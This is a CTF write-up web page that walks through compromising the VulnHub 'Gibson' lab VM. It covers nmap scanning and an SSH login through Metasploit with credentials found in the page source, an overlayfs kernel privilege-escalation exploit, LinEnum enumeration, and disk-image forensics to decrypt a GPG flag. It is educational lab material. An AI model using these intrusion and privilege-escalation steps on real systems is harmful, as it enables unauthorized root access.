@@ -1,0 +1,93 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Gibson VM (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-gibson-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-02-05T16:50:14+00:00">February 5, 2017</time><time class="updated" datetime="2025-06-10T20:30:17+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello friends!! Welcome to our next CTF challenge of the vulnhub called “Gibson” which is a boot to root challenge with the ultimate goal to get the Flag and finish the task. This VM is designed to test your penetration testing skills by spawning the root shell of this machine which is weak configured and the author has asked to find the hidden flag through privilege escalation. You can download it from the given below link. I found this lab more interesting as it has involved cyber forensic in it to get the final flag.</span></p>
+<p><span style="color: #000000;">Download it from here: <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/gibson-02,146/">https://www.vulnhub.com/entry/gibson-02,146/</a></strong></span></p>
+<h3><span style="color: #800000;"><strong>Penetration Methodology </strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Netdiscover, Nmap)</span></li>
+<li><span style="color: #000000;">Abusing HTTP service for username &amp; password</span></li>
+<li><span style="color: #000000;">Spawning Pty shell SSH (Metasploit)</span></li>
+<li><span style="color: #000000;">Privilege Escalation via Kernel exploit</span></li>
+<li><span style="color: #000000;">Uploading LinEnum script</span></li>
+<li><span style="color: #000000;">Obtain disk image</span></li>
+<li><span style="color: #000000;">Forensic Analysis for extracting hidden flag.img</span></li>
+<li><span style="color: #000000;">Decrypt GPG encrypted file using leet encoded value</span></li>
+<li><span style="color: #000000;">Capture the Flag</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s start off with scanning the network to find our targets IP.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Ak0NzyV9Clw/XAiYW2_W_BI/AAAAAAAAbmY/3t2TEwhSwysH3yg51Y1Ei1KRmQhiumILACLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">As our target IP is 192.168.1.100, now move to network enumeration and for this, we are going to scan network IP using nmap which will show all the open ports.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.100</pre>
+<p><span style="color: #000000;">In this case, open ports are only two i.e. 22 and 80 moreover it has found an html file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-uaYuaxKLX44/XAiYYWWgxHI/AAAAAAAAbmo/LsKgb3aHXOQYRZDTW7LUXdC6c7dndlDsACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">As from the above result, we have got 80 port open so we will open target IP in a browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zWHYujpyujU/XAiYYhNNlrI/AAAAAAAAbms/C4qAGWnH52wNqvnIR74j84fbRVpg2_TJgCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">It shows an accessible html page. But when we try to open it, we cannot see any crucial information here. It’s written the result will be found by brute force but there is no place where we can apply brute force.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-H4VJFmvHqAo/XAiYY0UihvI/AAAAAAAAbmw/hPiW_tCAhPQby_-0Ie28M6DrcYiULVa0QCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">As we do not have any other option so let’s just go to page source code to see if we could get any clue to move further in our task.</span></p>
+<p><span style="color: #000000;">Ohhh!! Great, there is something which is connecting to username and password, as per my prediction here <strong>god</strong> could be the possible password and <strong>margo </strong>could be the username.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nwkd1PiZe40/XAiYZJDX3bI/AAAAAAAAbm0/YBucYgwMlB43Twv-A5F7j1NzTY4eQs8lACLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Now from our nmap result, we saw port 22 open for ssh login. So let’s try to login into ssh using above found credential and for this, we will be taking help of Metasploit framework. By using the following module we can gain meterpreter session, once get successfully exploit.</span></p>
+<pre class="lang:default decode:true">use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(scanner/ssh/ssh_login) &gt;set rhosts 192.168.1.100
+msf auxiliary(scanner/ssh/ssh_login) &gt;set username margo
+msf auxiliary(scanner/ssh/ssh_login) &gt;set password god
+msf auxiliary(scanner/ssh/ssh_login) &gt;exploit</pre>
+<p><span style="color: #000000;">Hmm!! That’s great we have compromised the target machine, and you will love to see that the default opened session is command shell session and further we had upgrade into meterpreter session. And then run the “sysinfo” command to identify system architecture.</span></p>
+<p><span style="color: #000000;">As it was Ubuntu 14.04 (Linux 3.19.0-25-generic) so I search in Google for its kernel exploit for privilege escalation.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-2RWR5kQMk6U/XAiYZAevEJI/AAAAAAAAbm4/o-OAsOEfKiQ_IF4QXTVDUYhfBTILVmsEQCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Luckily, I found this kernel was badly affected by Overlayfs – A Local Privilege Escalation. Superb the Metasploit has an in-built module for this exploit.</span></p>
+<pre class="lang:default decode:true">use exploit/linux/local/overlayfs_priv_esc
+msf exploit(linux/local/overlayfs_priv_esc) &gt; set session 1
+msf exploit(linux/local/overlayfs_priv_esc) &gt; set lhost 192.168.1.109
+msf exploit(linux/local/overlayfs_priv_esc) &gt; exploit</pre>
+<p><span style="color: #000000;">Here again you will love to see that the default opened session is command shell session and further, we had upgrade into meterpreter session.</span></p>
+<pre class="lang:default decode:true">sessions -u 3</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-KMRzyFOp4io/XAiYZsggZWI/AAAAAAAAbm8/DTi3NwQyfM8xJyjL5dyoWimCv-bXvT6KgCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Now let’s upload LinEnum which is a scripted Local Linux Enumeration &amp; Privilege Escalation Checks Shellscript that enumerates the system configuration and high-level summary of the checks/tasks performed by LinEnum.</span></p>
+<p><span style="color: #000000;">To more about LinEnum script visit given below link:</span></p>
+<p><span style="color: #000000;"><em>https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/</em></span></p>
+<pre class="lang:default decode:true">upload /root/pentest/privs/LinEnum.sh .
+chmod 777 LinEnum.sh
+./LinEnum.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-dbryaj8lxPY/XAiYZrSoZEI/AAAAAAAAbnA/Z72aEPwjHwwLVJ9vGc0tUT74L2It9qWzgCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Here we get some interesting file which is highlighted in the below image. It shows some external server is running.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-V9ig0s6acpc/XAiYW_zpvyI/AAAAAAAAbmQ/9FJzje106-cS_aKYE6TdaWJEJI86N4e3gCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Now from the process list, we see something like<strong> ftpserv</strong> so we can just search for a file based on that.</span></p>
+<pre class="lang:default decode:true">find / -name ftpserv*</pre>
+<p><span style="color: #000000;">Awesome it gives us “ftpserv.img” file which can prove to be a useful thing, let’s download it in our local machine with the help of the following command.</span></p>
+<pre class="lang:default decode:true">download /var/lib/libvirt/images/ftpserv.img /root/Desktop/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Nq6AFfYyARk/XAiYWwDJ3lI/AAAAAAAAbmU/BwDv1fCF2xIf95a64AQLpx9v06IPtZu-gCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">So let’s check out what type of file it is?  With the help of <strong>file command</strong>, it shown the complete detail of the image file and hence by this, we came to know that this image file belongs to partition boot sector that contains all information of file system uses to access the volume.</span></p>
+<p><span style="color: #000000;">Now let’s find out the partition table of the device along with give sizes in the sector with the help of the following command</span></p>
+<pre class="lang:default decode:true">fdisk -lu ftpserv.img</pre>
+<p><span style="color: #000000;">Wonderful! It is a FAT16 file system and as we have entered into forensic phase, therefore you should have a little knowledge of cyber forensics. So we are going use Sleuth kit which is a command line forensic analysis tool kit to extract List file and directory names from this image with the help of the following command.</span></p>
+<pre class="lang:default decode:true">fls -f fat16 -o 63 ftpserv.img</pre>
+<p><span style="color: #000000;">Hmmm!! Here I found something very interesting a “garbage” folder, let’s explore this by executing below command.</span></p>
+<pre class="lang:default decode:true">fls -f fat16 -o 63 ftpserv.img 12</pre>
+<p><span style="color: #000000;">Awesome!! It was good to see an image file “flag.img” along with its inode number. An inode number holds metadata and I’m pretty sure that we will tack that information from inside the flag.img. Let’s extract all content of ftpserv.img in flag.img and then mount it.</span></p>
+<pre class="lang:default decode:true">icat -f fat16 -o 63 ftpserv.img 845580 &gt; flag.img
+mount flag.img /mnt
+cd /mnt
+ls</pre>
+<p><span style="color: #000000;">Booom!! Here I saw the very interesting file “hint.txt” which is holding two links.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ala8wg4GJPg/XAiYXjqAi4I/AAAAAAAAbmg/vIJcxDmqzmop8COK90zWPzKzURmO2MVhgCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">So when I visit both links then I found “<em>johnny lee miller”</em> is a common character in both links and in hacker movie he is called by “Zero Cool”.</span></p>
+<p><span style="color: #000000;">Then we explored more and found the hidden directory <strong>/.trash </strong>which holds an encrypted file <em>flag.txt.gpg</em> but “zero Cool” wasn’t the correct passphrase and it took an almost whole day to decrypt it.</span></p>
+<p><span style="color: #000000;">At last I thought from the hacker’s vision and encode the “zero Cool” into the leet function but unfortunately, I was unable to decrypt the encrypted file with the help of Z3r0C00l.</span></p>
+<p><span style="color: #000000;">But finally, obtain the correct passphrase <strong><em>Z3r0K00l</em></strong> by replacing C alphabet from K and execute the following command to decrypt gpg encryption.</span></p>
+<pre class="lang:default decode:true ">gpg --passphrase Z3r0K00l flag.txt.gpg</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-BajOZ0eBAt8/XAiYXiPXa6I/AAAAAAAAbmc/jCzFe5e4MXIdsBxHNZP_e8fyCZfow4W-wCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Hurray!! We successfully decrypted the file and obtain the flag.txt file. </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nMv8hohZ6oM/XAiYXi9sN9I/AAAAAAAAbmk/lsAFibP49xcAjNdI0fvCT3eMs98y24oHQCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
